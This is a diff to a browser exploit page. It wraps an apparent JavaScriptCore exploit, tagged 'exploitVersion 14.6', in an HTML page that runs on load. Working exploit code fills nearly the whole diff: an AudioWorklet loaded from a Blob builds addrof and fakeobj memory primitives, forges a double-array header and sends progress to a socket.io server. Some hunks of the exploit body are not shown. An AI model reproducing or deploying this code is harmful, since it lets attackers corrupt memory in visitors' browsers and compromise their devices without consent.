@@ -1,15 +1,18 @@
-var socket = io.connect("/");
-
-var keep = [];
-async function kickstart146() {
-	socket.emit("exploit_start", {
-		exploitVersion: "14.6",
-		userAgent: navigator.userAgent,
-	});
-	var context = new OfflineAudioContext(1, 128, 300000);
-	context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
+<html>
+<head>
+  <script type="text/javascript" src="/socket.io/socket.io.js"></script>
+  <script>
+    var socket = io.connect("/");
+    var keep = [];
+    async function start() {
+      console.log("started");
+      socket.emit("exploit_start", {
+        exploitVersion: "14.6",
+        userAgent: navigator.userAgent,
+      });
+      var context = new OfflineAudioContext(1, 128, 300000);
+      context.audioWorklet.addModule(URL.createObjectURL(new Blob([`
       // constant added to double JSValues
-      const socket = io.connect('/');
       const kBoxedDoubleOffset = 0x0002000000000000n;
       function boxDouble(d) {
         return d + kBoxedDoubleOffset;
@@ -96,15 +99,13 @@ async function kickstart146() {
         };
 
         let addr = addrof(obj);
-        socket.emit("log_normal", "Found obj @ 0x" + addr.toString(16));
-        port.postMessage("obj @ " + addr.toString(16));
+        port.postMessage("Found obj 0x" + addr.toString(16));
 
         let fakeArr = fakeobj(addr + 0x10n);
 
         // subtract off the incref
         doubleArrayCellHeader = float2bigint(fakeArr[0]) - 0x1n;
-        socket.emit("log_normal", "double array header @ 0x" + doubleArrayCellHeader.toString(16));
-        port.postMessage("double array header: " + doubleArrayCellHeader.toString(16));
+        port.postMessage("double array header 0x" + doubleArrayCellHeader.toString(16));
 
         // fix broken cell header
         fakeArr[0] = bigint2float(doubleArrayCellHeader);
@@ -170,16 +171,22 @@ async function kickstart146() {
         }
       });
     `,], { type: "text/javascript" })))
-    .then(async () => {
-        var wa = new AudioWorkletNode(context, "a");
-        var wb = new AudioWorkletNode(context, "b");
-        wa.port.onmessage = (e) => {
+        .then(async () => {
+          var wa = new AudioWorkletNode(context, "a");
+          var wb = new AudioWorkletNode(context, "b");
+          wa.port.onmessage = (e) => {
             socket.emit("log_normal", e.data);
-        };
-        await new Promise((res) => setTimeout(res, 100));
-        wa.port.postMessage("pwn");
-    })
-    .catch((err) => {
-        socket.emit("log_normal", "Error: " + err);
-    });
-}
+          };
+          await new Promise((res) => setTimeout(res, 100));
+          wa.port.postMessage("pwn");
+        })
+        .catch((err) => {
+          socket.emit("log_normal", "Error: " + err);
+        })
+    }
+  </script>
+</head>
+
+<body onload="start()">
+</body>
+</html>
